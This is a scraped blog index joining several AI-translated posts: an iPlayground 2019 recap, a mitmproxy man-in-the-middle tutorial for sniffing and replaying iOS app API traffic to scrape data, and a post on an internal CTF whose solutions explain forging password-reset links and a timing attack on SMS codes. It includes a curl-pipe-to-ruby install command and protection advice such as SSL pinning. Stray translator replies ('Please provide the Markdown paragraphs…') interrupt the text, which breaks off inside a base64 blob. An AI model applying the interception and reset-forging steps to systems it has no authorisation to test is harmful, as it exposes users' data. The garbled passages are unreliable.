Ethan HuangI previously wrote an article titled ‚ÄúLet‚Äôs Build an Apple Watch App!,‚Äù which was based on watchOS 5 using the traditional method. I didn‚Äôt expect that now we can develop with SwiftUI!Apple Watch OS 6 supports generations 1 to 5, so there are fewer version issues. Using watch apps to practice SwiftUI is a good starting point (relatively simplified); I‚Äôll find time to update it.p.s. I didn‚Äôt expect watchOS developers to be so niche QQ. Personally, I find it quite fun and hope more people will join!4. Security Issues of TinXie-Yizhi and Yang Xiaomie‚Äôs AppsRegarding the security issues of the APP itself, I had never seriously studied it before, as I always believed that ‚ÄúApple is very closed and secure!‚Äù After listening to the demonstrations by two speakers, I realized it is fragile rather than strong, and I understood the core concept of APP security itself: ‚ÄúWhen the cost of cracking exceeds the cost of protection, the app is secure.‚ÄùNo app can guarantee complete security; it can only increase the difficulty of hacking to deter attackers!Besides the paid app Reveal, there is also the open-source and free Lookin for viewing app UIs; we use Reveal frequently. Even if you don‚Äôt inspect others‚Äô apps, it‚Äôs very convenient for debugging your own UI issues!Additionally, regarding connection security, a few days ago I posted an article titled ‚ÄúThe app uses HTTPS transmission, but data was still stolen.‚Äù I used mitmproxy, a free tool, to perform a man-in-the-middle attack by swapping the root CA. Through the speaker‚Äôs explanation of man-in-the-middle attacks, their principles, and protection methods, I both verified the accuracy of my writing and gained a deeper understanding of this technique!I also broadened my horizons‚Ä¶ learning that there are jailbreak tweaks that can directly intercept network requests without even needing to swap certificates.5. Ting Peiyao‚Äôs Great Optimization of Compilation SpeedThis has always been a frustrating issue for us: slow compilation. Sometimes when tweaking the UI, it can be really maddening. You adjust by just 1pt, then wait, see the result, adjust by 1pt again, wait again, then change it back‚Ä¶ while(true)‚Ä¶ very frustrating!The speaker‚Äôs attempts and experience sharing are definitely worth exploring for use in your own projects! There are many more sessions (for example: risque topics A_A, previously also encountered color-related issues) But since the notes are scattered, and I have no related experience or did not attend that session All content can wait for the release of the iPlayground 2019 video replay (for sessions with recordings), or refer to the official HackMD collaborative notes.Soft GainsBesides technical gains, I personally gained more in terms of soft skills compared to last year. For the first time, I met Ethan Huang in person. While discussing the Apple Watch development ecosystem, I also casually exchanged a few words with the Cat God; additionally, I met many new developers, including my colleague Frank, Taihsin (a classmate of George Liu), Spock Xue, Crystal Liu, Nia Fan, Alice, Ada, old classmates like Peter Chen, and former colleague Hao Ge Qiu Yuhao‚Ä¶ and many other new friends!Understood! Please provide the Markdown paragraphs you want me to translate into English. More highlights can be found on Twitter #iplaygroundThanks Thanks to all the staff for their hard work and to the speakers for their sharing, making these two days full of valuable experiences! Thank you for your hard work! Much appreciated!If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "HTTPS Data Theft in iOS & MacOS AppsÔΩúMitmproxy Man-in-the-Middle Attack Explained", "url": "/posts/zrealm-dev/https-data-theft-in-ios-macos-apps-mitmproxy-man-in-the-middle-attack-explained-46410aaada00/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, mitmproxy, man-in-the-middle, ios, ios-app-development, hacking", "date": "2019-09-20 18:01:01 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The app uses HTTPS for transmission, but data was still stolen.iOS+MacOS Using...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!The app uses HTTPS for transmission, but data was still stolen.iOS+MacOS Using mitmproxy for Man-in-the-middle Attack to Sniff API Data Transmission: Tutorial and Prevention Methods?PrefaceA while ago, we just held an internal CTF competition at the company. When brainstorming challenges, I recalled a project I worked on in college as a backend (PHP) developer‚Äîa points collection app. It basically had a task list, and when a trigger condition was met, it would call an API to earn points. The boss thought that using HTTPS to encrypt data transmission made the API calls very secure‚Äîuntil I demonstrated a man-in-the-middle attack, sniffing the transmitted data and forging API calls to gain points‚Ä¶.With the rise of big data in recent years, web crawlers have become widespread; the battle between crawling and anti-crawling has intensified, with many tricks used on both sides, as described in Tips of Anti-Spider in FE. It‚Äôs truly a game of cat and mouse!Another target for web scraping is the app‚Äôs API. Without any protection, it‚Äôs like leaving the door wide open; it‚Äôs not only easy to use but also has a clean format and is harder to detect and block. So, if the website has made all efforts to prevent scraping but data is still being extracted, it‚Äôs worth checking if the app‚Äôs API has any vulnerabilities.Because I don‚Äôt know how to include this topic in a CTF competition, I am posting this article as a record; this is just a basic concept ‚Äî HTTPS can be decrypted by certificate replacement during transmission, and how to enhance security to prevent it; actual network theory is not my strong suit and I have left that to the experts. If you already understand this concept, you don‚Äôt need to spend time reading this article, or scroll down to see how apps should be protected!Practical OperationEnvironment: MacOS + iOS Android users can directly download Packet Capture (free). iOS users can use Surge 4 (paid) to enable the man-in-the-middle attack feature. MacOS users can also use another paid software, Charles. This article mainly explains how to use the free mitmproxy on iOS. If you already have the above environment, you don‚Äôt need to go through these steps. Just open the app, enable the VPN on your phone, and replace the certificate to perform a man-in-the-middle attack! (Please scroll down to see how to protect yourself!)[Updated 2021/02/25]: There is a new free graphical interface program for Mac (Proxyman) available, which can be used along with the first part of this article.Install mitmproxyInstall directly using brew:brew install mitmproxyInstallation Complete!p.s If you encounter brew: command not found, please install the brew package manager first:/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"Using mitmproxyAfter installation, enter the following command in Terminal to activate:mitmproxyStartup successfulConnect your phone and Mac on the same local network &amp; find your Mac‚Äôs IP addressMethod (1) Connect Mac to WiFi, and use the same WiFi on your phoneMac‚Äôs IP Address = ‚ÄúSystem Preferences‚Äù -&gt; ‚ÄúNetwork‚Äù -&gt; ‚ÄúWi-Fi‚Äù -&gt; ‚ÄúIP Address‚ÄùMethod (2) Use a wired network on Mac, enable Internet Sharing; connect your phone to this hotspot network:‚ÄúSystem Preferences‚Äù -&gt; ‚ÄúSharing‚Äù -&gt; Select ‚ÄúEthernet‚Äù -&gt; Check ‚ÄúWi-Fi‚Äù -&gt; Enable ‚ÄúInternet Sharing‚ÄùMac‚Äôs IP Address = 192.168.2.1 (‚ö†Ô∏è Note: This is not the Ethernet network IP, but the IP Mac uses as a network sharing hotspot)Mobile Network Settings WiFi ‚Äî Proxy Server Information‚ÄúSettings‚Äù -&gt; ‚ÄúWiFi‚Äù -&gt; ‚ÄúHTTP Proxy‚Äù -&gt; ‚ÄúManual‚Äù -&gt; ‚ÄúEnter Mac‚Äôs IP address in Server‚Äù -&gt; ‚ÄúEnter 8080 in Port‚Äù -&gt; ‚ÄúSave‚Äù It is normal for the webpage to fail to load and show a certificate error at this point; let‚Äôs continue‚Ä¶Installing mitmproxy Custom HTTPS CertificateAs mentioned above, the way a man-in-the-middle attack works is by using its own certificate to intercept and decrypt data during communication; therefore, we also need to install this custom certificate on the phone.1. Open http://mitm.it on your mobile SafariLeft side -&gt; Proxy setting is correct ‚úÖ / Right side indicates Proxy setting error üö´‚ÄúApple‚Äù -&gt; ‚ÄúInstall Profile‚Äù -&gt; ‚ÄúInstall‚Äù ‚ö†Ô∏è It‚Äôs not over yet; we still need to enable the provisioning profile inside.‚ÄúGeneral‚Äù -&gt; ‚ÄúAbout‚Äù -&gt; ‚ÄúCertificate Trust Settings‚Äù -&gt; Enable ‚Äúmitmproxy‚ÄùDone! Now, when we return to the browser, we can browse web pages normally.Back to operating mitmproxy on MacYou can see the recent mobile data transmission records on the mitmproxy Terminal.Find the record you want to sniff and view the Request (which parameters were sent) / Response (what content was returned)Common Shortcut Keys:„Äå ? „Äç= View key operation documentation„Äå k „Äç/„Äå‚¨Ü„Äç= Up„Äå j „Äç/„Äå‚¨á„Äç= Down„Äå h „Äç/„Äå‚¨Ö„Äç= Left„Äå l „Äç/„Äå‚û°Ô∏è„Äç= Right„Äå space „Äç= Next page„Äå enter „Äç= Enter to view details„Äå q „Äç= Go back/Exit„Äå b „Äç= Export response body to specified path text file„Äå f „Äç= Filter record conditions„Äå z „Äç= Clear all records„Äå e „Äç= Edit Request (cookie, headers, params...)„Äå r „Äç= Resend RequestNot used to CLI? No worries, you can switch to a Web GUI!Besides the mitmproxy activation method, we can change to:mitmwebYou can use the new Web GUI for operation monitoring.mitmwebThe main event: sniffing app data:After setting up and becoming familiar with the above environment, we can move on to the main event: sniffing the data transmission of the app‚Äôs API! This example uses a specific real estate app for academic purposes only, with no malicious intent! We want to know how the object list API is requested and what content it returns!First, press ‚Äúz‚Äù to clear all records (to avoid confusion).Open the target APPOpen the target app and try to perform a ‚Äúpull-to-refresh‚Äù or trigger the ‚Äúload next page‚Äù action. üõëIf your target APP won‚Äôt open or connect; sorry, it means the APP has protection and this sniffing method won‚Äôt work. Please scroll down to the ‚ÄúHow to Protect‚Äù sectionüõëmitmproxy RecordingReturn to mitmproxy to check the logs, use your detective skills to guess which API request record is the one we want, and then view the details!RequestIn the Request section, you can see which parameters were passed in the request.Use ‚Äúe‚Äù to edit and ‚Äúr‚Äù to resend, then observe the Response to guess the purpose of each parameter!ResponseResponse can also directly obtain the raw returned content. üõëIf the response content is a bunch of encoded data; sorry, it means the app may be encrypting or decrypting again, and this method cannot be used to sniff it. Please scroll down directly to the section on how to protectüõëHard to read? Chinese characters garbled? No problem. You can export as a text file to the desktop using ‚Äúb,‚Äù then copy the content to Json Editor Online for parsing! **Or directly use mitmweb to browse and operate via the web GUI*mitmwebAfter sniffing, observing, filtering, and testing, you can understand how the app API works, allowing you to use it for data scraping with crawlers. *After collecting the required information, remember to close mitmproxy and set your phone‚Äôs network proxy back to automatic to use the internet normally.How Should the APP Protect Itself?If the app stops working or returns encoded content after attaching mitmproxy, it means the app has protection implemented.Method (1):Basically, the certificate information is embedded in the app. If the current HTTPS certificate does not match the one in the app, access is denied. For more details, you can see here or look for resources related to SSL Pinning. The downside is that you need to pay attention to the certificate‚Äôs validity period!https://medium.com/@dzungnguyen.hcm/ios-ssl-pinning-bffd2ee9efcMethod (2):Before data transmission, the APP performs encoding and encryption. The API backend decrypts the data to get the original request content; the API response is also encoded and encrypted first. The APP decrypts the received data to obtain the response content. The process is tedious and resource-consuming but is indeed a method; as far as I know, some digital banks use this approach for protection!However‚Ä¶.Method 1 still has a bypass: How to Bypass SSL Pinning on iOS 12Method 2: Obtain the encryption key for encoding through reverse engineering‚ö†Ô∏è Not 100% Secure ‚ö†Ô∏èOr just dig a hole for it to crawl through, collecting all kinds of evidence along the way, then let the legal team handle it (?)The same phrase: ‚ÄúNEVER TRUST THE CLIENT‚ÄùMore Ways to Use mitmproxy:1. Using mitmdumpExcept for mitmproxy and mitmweb, mitmdump can directly export all records to a text file.mitmdump -w /log.txtAnd you can use Method (2) Python script to set and filter traffic:mitmdump -ns examples/filter.py -r /log.txt -w /result.txt2. Using Python to Set Request Parameters, Access Control, and Redirect:from mitmproxy import httpdef request(flow: http.HTTPFlow) -&gt; None: # pretty_host takes the \"Host\" header of the request into account, # which is useful in transparent mode where we usually only have the IP # otherwise. # Request parameter setting example: flow.request.headers['User-Agent'] = 'MitmProxy' if flow.request.pretty_host == \"123.com.tw\": flow.request.host = \"456.com.tw\" # Redirect all visits from 123.com.tw to 456.com.twRedirect ExampleAdd parameters when enabling mitmproxy:mitmproxy -s /redirect.pyormitmweb -s /redirect.pyormitmdump -s /redirect.pyFilling the GapWhen using mitmproxy to observe requests with HTTP 1.1 and Accept-Ranges: bytes, Content-Range for continuous partial resource retrieval over a persistent connection, it waits until the entire response is received before displaying it, rather than showing the segments or continuing the download over the persistent connection!Pitfalls here „ÄÇFurther Reading Using a Check-in Reward APP as an Example to Create a Daily Auto Check-in Script How to Create an Engaging Engineering CTF Competition Revealing a Clever Website Vulnerability Discovered a Few Years Ago iOS 15 / MacOS Monterey Safari will be able to hide real IP PostscriptBecause I don‚Äôt have domain permissions, I can‚Äôt obtain the SSL certificate information, so I can‚Äôt implement it; from the code, it doesn‚Äôt seem difficult. Although there‚Äôs no 100% secure method, adding an extra layer of protection can at least improve security. Further attacks would require a lot of time to study and should deter about 90% of crawlers!This article might lack substantial content as I neglected Medium for a while (went off to play with a DSLR). This is mainly a warm-up post for this weekend (2019/09/21‚Äì2019/09/22) at iPlayground 2019; looking forward to this year‚Äôs sessions ü§© and hoping to produce more quality articles after returning! [Article updated on 2019/02/22] What is the experience of iPlayground 2019?If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Engineering CTF CompetitionÔΩúDesign Engaging Challenges & Setup Efficiently", "url": "/posts/zrealm-dev/engineering-ctf-competition-design-engaging-challenges-setup-efficiently-729d7b6817a4/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, capture-the-flag, ios-app-development, php, computer-science, wargame", "date": "2019-07-24 22:32:34 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!How to Create an Engaging Engineering CTF CompetitionCapture The Flag Competit...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!How to Create an Engaging Engineering CTF CompetitionCapture The Flag Competition Setup and Challenge IdeasAbout CTFCapture The Flag, abbreviated as CTF, is a sport originating from the West. It is commonly seen in modern paintball and first-person shooter games. The original concept involves teams protecting their own flags from being captured while trying to capture the flags of other teams. In the computer field, it refers to ‚Äúoffensive and defensive hacking battles,‚Äù where teams first find and protect their own vulnerabilities from intrusion, while simultaneously launching zero-delay attacks to capture points from other teams.The above represents a standard, or even ‚Äúadvanced,‚Äù CTF competition format. Running a CTF competition within a company involves additional practical considerations: The purpose of hosting a CTF competition, besides enhancing technical skills, is also to promote communication among engineers. Engineers have different specialties, including Front-End, Back-End, APP, and DevOps; if you want everyone to participate, the questions should not focus too much on a specific field (e.g., networking, PHP). Groups should balance strengths and evenly distribute domain expertise. The event lasts at most one afternoon. Organizing a CTF competition is a side project outside of the main work duties, with limited resources and time. Considering all the above factors, rather than calling it a CTF competition, it is more like a: Group Puzzle Solving to Earn Flag Points &amp; Promote Interaction Among EngineersA beginner-level CTF competition!Event Objectives Enhancing Engineering Skills Promoting communication among engineers Inspiring everyone‚Äôs passion and keen insight for exploration Interesting things are fun; boring things are painful to do. 3 and 4 are my own additions. My expectations for this event go beyond practical aspects; I hope to boost everyone‚Äôs passion for exploring and learning new things in a fun way. Just like in daily work, we shouldn‚Äôt just be coders; we need to find ways to break through and keep moving forward!Competition Rules Divide engineers into groups evenly based on their expertise and strengths. Competition Time: 90 minutes There are a total of 12 questions, with 3 chances to spend points to buy hints. Purchase cost decreases over time (the earlier you buy, the more expensive it is) Each question has a base score plus a time bonus (the earlier you solve, the more points you get) Once you start answering a specific question, you will be locked to only answer that question or other already opened questions; this continues until the question is passed or the lock time ends.(This rule exists because the activity mainly aims to encourage team members to communicate and brainstorm together, rather than dividing the work.) The score per question, hint cost, and lock time vary according to the difficulty of the question. Victory Condition: The highest cumulative score wins. If scores are tied, the faster completion time determines the winner. The winning team has $$ How to Build?After clarifying the event rules and objectives, the next key point is how to win a CTF competition?This section is divided into two chapters: First, building a system capable of hosting CTF competitions, and Second, brainstorming competition challenges.1. Building a System Capable of Hosting CTF Competitions This part requires both front-end and back-end skills to implement. If you are not familiar, you will need to ask other colleagues for help.Frontend: Semantic UIBackend: PHP + JSON file for data storageDue to limited time, the competition system was built with simplicity, stability, and speed in mind. The front-end interface directly uses the Semantic UI framework. The back-end is written in PHP without any framework. Data storage is handled using JSON files without a database. Keeping everything simple also reduces potential issues (such as someone trying to hack the system to get the answers).Entry Page:Starting with fun, the landing page uses references from the BBC series Sherlock:Phone Unlock Password S H E RThese four input boxes are for entering the identification codes (4 digits) obtained by each group. For example, enter the first group: ‚Äú1432‚Äù, the second group: ‚Äú8421‚Äù, to identify which group will answer the questions.As for the identification codes for each group, I added a little twist. The codes are displayed as follows:Can you see the four-digit code? If not, please step back from the screen and take another look.Ë´ãÊèê‰æõÊÇ®ÈúÄË¶ÅÁøªË≠ØÁöÑ Markdown ÊñáÁ´†ÊÆµËêΩÂÖßÂÆπ„ÄÇË´ãÊèê‰æõÊÇ®Ë¶ÅÁøªË≠ØÁöÑ Markdown ÊñáÁ´†ÊÆµËêΩÂÖßÂÆπÔºåÊàëÂ∞á‰æùÁÖßÊÇ®ÁöÑË¶ÅÊ±ÇÈÄ≤Ë°åÁøªË≠Ø„ÄÇË´ãÊèê‰æõÊÇ®ÊÉ≥ÁøªË≠ØÁöÑ Markdown ÊñáÁ´†ÊÆµËêΩÂÖßÂÆπÔºåÊàëÊúÉÂπ´ÊÇ®ÈÄ≤Ë°åÁøªË≠Ø„ÄÇ‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶Please provide the Markdown paragraphs you want me to translate into English.‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶.‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶. .‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶.‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶. .Ë´ãÊèê‰æõÊÇ®Ë¶ÅÁøªË≠ØÁöÑ Markdown ÊÆµËêΩÂÖßÂÆπÔºåÊàëÂ∞á‰æùÊìöÊÇ®ÁöÑË¶ÅÊ±ÇÈÄ≤Ë°åÁøªË≠Ø„ÄÇË´ãÊèê‰æõÊÇ®ÈúÄË¶ÅÁøªË≠ØÁöÑ Markdown ÊñáÁ´†ÂÖßÂÆπ„ÄÇ. .Answer: The ID for the first group is 8291After entering, you will go to the competition system homepage - problem list:Displayed above: Team 1 group, remaining number of hint ticketsMiddle Question Area: Question title, description, passing score, lock time, purchase hint, hint displayMouse hover will display time score and suggested priceDisplayed below: Total current scoreBackend and Other Logic: The question list page uses Ajax every second to request the current answering status from the backend. The backend reads and records the answering status in each group‚Äôs JSON file. When unlocking a question, the time is recorded; questions cannot be unlocked before the set time. Upon passing a question, the completion time is recorded. Time scores and hint prices increase or decrease based on the time spent. The competition system is roughly like this, but the focus is not on the system itself, but on the questions! Is it interesting, can everyone participate, is it logical, is it novel‚Ä¶ it‚Äôs really hard to come up with ideasLet‚Äôs get straight to the point!2. Competition Topic IdeationFirst, I will introduce the five topics I have come up with.1. The Gate to the Magic AcademyProblem Description: You will receive a key string. Use this key to decode the spell and enter it in the spell input box. Below, there is a captcha field that needs to be filled in. Press verify to submit your answer.Answer:This question tests cybersecurity and coding issues; it involves platform encryption and decryption vulnerability interfaces. If a website uses the same method and key for all encryption and decryption, we can exploit this weakness to decrypt the content and obtain the original data!You can see the captcha part is ./image.php?token=AD0HbwdgVDw=. Here, a decryption interface is provided, so we can try using the above encryption key:You will get the decrypted string: LiveALifeYouWillRemeberEnter it into the spell input box to clear the level!2. Please take me back to Shanghai in 1937!Problem Description: You need to find a way to input year/month/day and submit it to the backend so that the backend recognizes the year as 1937; the input year range (1947~2099) does not allow directly entering 1937.Answer:This question is not about bypassing front-end validation, as the back-end handles it and cannot be bypassed. The main focus is on the 32-bit computer Year 2038 problem. Due to the 32-bit limit, the timestamp can only represent dates up to January 19, 2038, 03:14:07. Beyond this, it will overflow and reset to January 1, 1901. Therefore, by inputting dates from 2073‚Äì02‚Äì06 to 2074‚Äì02‚Äì05, the system will interpret them as dates in 1937. Entering dates within this range will allow successful submission!Wikipedia3. The Duel of WitsProblem Description: Find a way to intercept a password reset email sent to a third party‚Äôs email account (which you cannot log into) and complete the password reset for that person.Answer:This task requires more sensitivity. First, use an email account you can access to reset the password; the email we received is as follows:Your password reset link: http://ctf.zhgchg.li/10/reset.php?requestid=OTk= If this is not related to you, please ignore this message. Thank you!We can see that the password reset request is identified through the parameter requestid. The value we got is OTk=, which looks like base64? Let‚Äôs try it:base64 decode and encodeWe can get the parameter value as 99, then repeat the password reset request to get 100. Therefore, it can be inferred that the password reset requests are sequential numbers, with the next being 101. At this point, returning to the original email to bypass and pressing the reset password request, we can forge and combine the password reset link ourselves, thus secretly resetting someone else‚Äôs password.Encode 101 in Base64 =&gt; MTAx. Fake URL: http://ctf.zhgchg.li/10/reset.php?requestid=MTAx. Enter any password and click reset to pass!4. Vest MasterTask Description: You need to create 10 sets of Gmail accounts (Gmail hosted mailboxes) to receive answer emails.Answer:Of course, this problem can be brute-forced, but company email accounts cannot be registered casually; unless you find 10 people to help receive emails, it cannot be solved.The key point here is the Gmail mailbox / Gmail hosted mailbox. Since the company mailbox is a Gmail hosted mailbox, it also has the features of a Gmail mailbox: you can use ‚Äú.‚Äù and ‚Äú+‚Äù to create unlimited alias addresses. The ‚Äú.‚Äù can be placed anywhere in the username, and the ‚Äú+‚Äù can be placed at the end followed by any numbers.For example: The main mailbox is zhgchgli@gmail.com, but emails sent to z.hgchgli@gmail.com, zh.gchgli@gmail, zhgchgli+1@gmail.com, zhgchgli+25@gmail.com, and so on will all be delivered to the main mailbox zhgchgli@gmail.com. One mailbox can create multiple identities!This article mainly reminds everyone to filter out these characters during account registration to prevent malicious users from creatingÂ§ßÈáèfake accounts.After collecting 10 letters, you can assemble the URL containing the answer. Enter the URL to clear the level!5. Time MachineProblem Description: Similar to question 3 ‚ÄúFace/Off,‚Äù you need to find a way to intercept a third party‚Äôs (you cannot receive their SMS) mobile SMS verification code (4-digit number) to log into someone else‚Äôs account.Answer:This problem is relatively obscure and difficult, mainly simulating a side-channel timing attack. The system login verification involves a complex algorithm, and there is a time difference when processing verification information (for example: processing one correct digit takes longer, while a completely wrong input returns immediately and quickly). By observing these time differences, we start from 0000 and try each digit one by one. When trying 2000, we notice it takes one second to process, indicating the first digit is 2. Continuing with 2100, it still takes one second, but 2200 takes even longer‚Äîtwo seconds. By further testing the third and fourth digits, we eventually obtain the correct answer: 2256.This example only simulates this type of attack. The backend processing uses sleep to mimic the delay without actual complex algorithms. Such attacks are rarely encountered in web or app environments. On one hand, the processing is not complex enough to cause noticeable time differences; on the other hand, network factors also affect timing, making it difficult to judge.For detailed information about side-channel attacks, please refer to this article:](/assets/729d7b6817a4/1*SF1S_RZNTI-5ZaC3Kw1Ypw.webp){: lqip=‚Äùdata:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNDAwIiBoZWlnaHQ9IjkwNSI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iZ3JleSIvPjwvc3ZnPg==‚Äù }Understand CORB in 30 Minutes ‚Äî Side-Channel Attacks The above are the 5 questions I came up with. Below are the remaining 7 questions provided by my colleagues.1. Sadako AppearanceSadako image sourced from the internetProblem Description: The problem is an image of Sadako. You need to enter what Sadako wants to say in the input box above to pass.Answer:This question tests whether you know that images can contain other information. The key lies in the original version of this image:Sadako image sourced from the internetThis image has secretly compressed a text file inside it (for the actual method, please refer to: How To Hide A ZIP File Inside An Image On Mac [Quicktip] , note the Win/Mac compatibility issues here)So we only need to simply unzip the Commone image to get the passcode string:Enter ‚ÄúYOUHAVENOIDEA‚Äù in the input box to pass!Supplement:Regarding hidden information in images, there is another method using ‚ÄúImage Steganography‚Äù.Image Steganography and Malware: Principles and MethodsSimply put, it manipulates the pixel color values to hide information. The actual image changes, but the difference is invisible to the naked eye.I was worried everyone would take this approach, so I hid a code in the image. Those who follow this path can get a hint:Steganography OnlineUpload the image to an online steganography decoding tool to get the hint.2. Caesar‚Äôs Morse CodeThe images are sourced from the internet.Problem Description: Decode the given Morse code to find the hidden message (an English sentence).Answer:This question is quite straightforward. The first step is to decode the Morse code into the English letters ‚ÄúVYYXI DN HT GDAZ‚Äù.Morse Code TranslatorThen perform a Caesar cipher decryption. When we try a shift of 5, we get a meaningful English sentence: ‚Äúaddcn is my life,‚Äù which is the answer!Caesar Cipher Decryption Tool3. What do you think it is?Opening the webpage for this question shows a lot of garbled text, as follows:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA...Problem Description: Find the answer from this jumble of characters.Answer:This question is actually quite straightforward and doesn‚Äôt require much thought; frequent coders should recognize this jumble as a base64 string. Let‚Äôs first decode it, and we get:data:image/png;base64,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